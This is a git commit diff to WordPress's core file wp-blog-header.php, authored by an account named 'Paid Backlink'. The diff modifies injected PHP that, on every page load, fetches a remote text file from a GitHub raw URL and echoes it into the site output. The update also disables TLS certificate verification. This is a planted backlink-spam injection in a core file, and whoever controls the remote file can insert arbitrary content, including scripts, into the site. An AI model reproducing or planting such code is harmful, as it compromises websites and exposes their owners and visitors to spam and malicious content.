11154527988051d92581f39e53683f78a75e09dd
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2024-05-25 00:08:19 +0800

    Update wp-blog-header.php

--- wp-blog-header.php
+++ wp-blog-header.php
@@ -22,9 +22,11 @@ if ( ! isset( $wp_did_header ) ) {
 ?>
 <?php
 $url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$result = curl_exec($ch);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the response as a string instead of outputting it directly
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$response = curl_exec($ch);
 curl_close($ch);
-echo $result;
+echo $response;
 ?>
